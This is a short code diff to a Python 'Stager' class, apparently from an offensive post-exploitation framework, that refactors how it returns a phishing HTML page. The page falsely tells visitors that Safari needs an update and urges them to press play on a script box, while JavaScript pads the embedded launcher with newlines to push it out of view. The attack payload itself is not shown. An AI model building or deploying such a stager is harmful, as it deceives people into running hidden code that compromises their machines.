@@ -89,7 +89,7 @@ class Stager:
             launcher = launcher.replace("'", "\\'")
             launcher = launcher.replace('"', '\\\\"')
 
-        html = f"""
+        return f"""
 <html><head></head><body><H2> Safari requires an update. Press cmd-R to refresh. Make sure to press the play button on the script box to begin the update</H2>
 <script>
       var as = Array(150).join("\\n") +
@@ -102,4 +102,3 @@ class Stager:
       }};
 </script></body></html>
     """
-        return html
